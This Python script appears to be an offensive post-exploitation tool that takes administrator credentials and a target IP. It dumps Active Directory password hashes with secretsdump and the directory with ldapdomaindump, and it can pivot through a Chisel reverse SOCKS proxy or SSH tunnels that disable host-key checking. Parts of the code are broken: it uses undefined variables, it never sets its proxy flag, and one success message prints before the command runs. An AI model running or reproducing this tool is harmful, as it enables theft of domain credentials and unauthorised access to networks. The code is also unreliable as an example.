import subprocess
import os
import questionary
from questionary import Style, select

## Global Variables
# Global variable to track if SOCKS Proxy was selected
use_socks_proxy = False

def proxy_image():
    # Build the Docker image
    docker_image = "socks_proxy_image"
    print("Building the Docker container...")
    try:
        subprocess.run(["sudo", "docker", "build", "-t", docker_image, "."], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error occurred while building Docker image: {e}")
        return

    try:
        # Start Chisel client in the background and SSH into the target via the SOCKS proxy
        print("Starting Chisel client and SSH session inside Docker container...")
        subprocess.run(
            [
                "sudo", "docker", "run", "--rm", "-it",
                docker_image,
                "bash", "-c",
                f"chisel client {socks_ip}:{socks_port} R:socks & sleep 5 && sshpass -p '{password}' ssh -o 'StrictHostKeyChecking=no' -o 'UserKnownHostsFile=/dev/null' {username}@{ssh_target_ip} /bin/bash"
            ],
            check=True
        )
    except subprocess.CalledProcessError as e:
        print(f"Error occurred while running Chisel or SSH in the container: {e}")
        return

    print("\033[32m[+] SOCKS Proxy and SSH session completed successfully!\033[0m")


def tunneltype():
    global use_socks_proxy

    proxy_question = input("Do you have to tunnel this connection through an intermediary? (Y/N): ").strip().lower()

    if proxy_question == "y":
        tunnel_choice = select(
            "Tunnel Type:",
            choices=["SOCKS Proxy", "SSH Tunnel", "TCP Tunnel", "Exit"],
            style=custom_style
        ).ask()

        match tunnel_choice:
            case "SOCKS Proxy":
                socks_ip = input("Enter SOCKS Server IP: ")
                socks_port = input("Enter SOCKS Server Port: ")

                # Attempt to connect to the Chisel server
                try:
                    print("Connecting to Chisel server...")
                    print("\033[32m[+] Successfully connected to Chisel server for redirection.\033[0m")
                    subprocess.run(
                        f"chisel client {socks_ip}:{socks_port} R:socks &",
                        shell=True,
                        check=True
                    )
                    print("\033[32m[+] Successfully connected to Chisel server for redirection.\033[0m")
                    return True  # Return True here since the setup is successful
                except subprocess.CalledProcessError as e:
                    print("\033[31m[-] Failed to connect to Chisel server. Error:\033[0m", e)
                    return False  # Return failure status
#######################################
            case "SSH Tunnel":
                ssh_tunnel_ip = input("Enter SSH Tunnel IP: ")
                ssh_tunnel_port = input("Enter SSH Tunnel Port (default: 22): ").strip() or "22"
                ssh_tunnel_user = input("Enter SSH Username for the Tunnel: ")
                ssh_target_port = input("Please enter the destination port of your final target (Ex: SMB/445): " )

                tunnel_auth_method = select(
                    "Select SSH Authentication Method for the Tunnel:",
                    choices=["Password", "SSH Key"],
                    style=custom_style
                ).ask()

                if tunnel_auth_method == "Password":
                    tunnel_password = input("Enter SSH Password for the Tunnel: ")
                    ssh_command_prefix = f"sshpass -p '{tunnel_password}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
                elif tunnel_auth_method == "SSH Key":
                    tunnel_key_file = select_ssh_key()
                    if not tunnel_key_file:
                        print("No valid SSH key selected. Exiting.")
                        return False
                    ssh_command_prefix = f"ssh -i /root/.ssh/{tunnel_key_file} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"

                # Construct the SSH command to set up the tunnel
                command = (
                    f"{ssh_command_prefix} -N -L 127.0.0.1:2222:{ssh_tunnel_ip}:{ssh_target_port}"
                    f"{ssh_tunnel_user}@{ssh_tunnel_ip} -p {ssh_tunnel_port}"
                )

                try:
                    # Run the command in the background
                    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

                    print("\033[32m[+] Successfully set up SSH tunnel in the background.\033[0m")
                    print("\033[32m[+] Process ID (PID):\033[0m", process.pid)

                    return True  # Return True for successful SSH tunnel setup
                except Exception as e:
                    print(f"\033[31m[-] Failed to set up SSH tunnel. Error:\033[0m {e}")
                    return False  # Return failure status
####################################
            case "TCP Tunnel":
                print("TCP Tunnel module is still under development.")
                return False

            case "Exit":
                print("Exiting tunnel setup.")
                return False

            case _:
                print("Invalid choice. Exiting tunnel setup.")
                return False

    else:
        return True


def creds():
    print("\033[94mModule Selected: Domain Credentials Dump\033[0m")
    domain = input("Enter Target Domain (Ex: steel.arizona.tu): ")
    username = input("Enter High Privilege LDAP Username (Ex: Administrator): ")
    password = input("Enter High Privileged LDAP User's Password: ")
    target = input("Enter Target IP: ")

    tunneltype()
    # Check if SOCKS Proxy is enabled from tunneltype()
    if use_socks_proxy:
        print("\033[32m[+] Using SOCKS Proxy for secretsdump.\033[0m")
        command = [
            "proxychains",
            "/usr/local/bin/secretsdump.py",
            f"'{domain}/{username}:{password}'@{target}",
            "-outputfile",
            "secretsdump_output.txt"
        ]
    else:
        command = [
            "/usr/local/bin/secretsdump.py",
            f"'{domain}/{username}:{password}'@{target}",
            "-outputfile",
            "secretsdump_output.txt"
        ]

    outfile = "secretsdump_output.txt"  # Define your desired output file here

    try:
        # Execute the command and capture output
        result = subprocess.run(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=True
        )

        # Save stdout to the output file
        with open(outfile, "w") as output_file:
            output_file.write(result.stdout)

        # Print success message and the command output
        print(f"\033[32m[+] Secretsdump completed successfully. Output saved to {outfile}.\033[0m")
        print("\033[32m[+] Command Output:\033[0m")
        print(result.stdout)

        # Print any warnings or errors
        if result.stderr:
            print("\033[33m[!] Command Warnings or Errors:\033[0m")
            print(result.stderr)
    except subprocess.CalledProcessError as e:
        print(f"\033[31m[-] Failed to run secretsdump. Error:\033[0m {e.stderr}")

def ldap():
    # Placeholder for LDAP domain dump functionality
    print("\033[94mModule Selected: Full LDAP Domain Dump\033[0m")
    domain = input("Enter Target Domain (Ex: steel.arizona.tu): ")
    username = input("Enter High Privilege LDAP Username (Ex: Administrator): ")
    password = input("Enter High Privileged LDAP User's Password: ")
    target = input("Enter Target IP: ")

    tunneltype()
    # Check if SOCKS Proxy is enabled from tunneltype()
    if use_socks_proxy:
        print("\033[32m[+] Using SOCKS Proxy for LDAP dump.\033[0m")
        command = [
            "proxychains",
            "ldapdomaindump",
            target,
            "-u",
            f"{domain}\\{username}",
            "-p",
            password,
            "--no-json",
            "--no-grep"
        ]
    else:
        command = [
            "ldapdomaindump",
            target,
            "-u",
            f"{domain}\\{username}",
            "-p",
            password,
            "--no-json",
            "--no-grep"
        ]

    # Run the command
    try:
        print("\033[32m[+] Running LDAP domain dump...\033[0m")
        result = subprocess.run(command, check=True, capture_output=True, text=True)
        print("\033[32m[+] LDAP domain dump completed successfully.\033[0m")
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print("\033[31m[-] LDAP domain dump failed. Error:\033[0m", e)
        print(e.stderr)

# Define custom style
custom_style = Style([("choice", "fg:blue")])
ascii_art = r"""
+-----------------------------------------------------------------------------+
|                                                                             |
|   _______________________________ ____________________ ___________________  |
|   \______   \______   \_   _____//   _____/\_   _____/ \      \__    ___/   |
|    |     ___/|       _/|    __)_ \_____  \  |    __)_  /   |   \|    |      |
|    |    |    |    |   \|        \/        \ |        \/    |    \    |      |
|    |____|    |____|_  /_______  /_______  //_______  /\____|__  /____|      |
|                     \/        \/        \/         \/         \/            |
|                                                                             |
+-----------------------------------------------------------------------------+
"""

print(f"\033[35m{ascii_art}\033[0m")

choice = select(
    "What do you wish to collect:",
    choices=["Credentials", "LDAP", "Exit"],
    style=custom_style
).ask()

if choice == "Credentials":
    creds()
elif choice == "LDAP":
    ldap()
elif choice == "Exit":
    print("Exiting the program. Goodbye!")
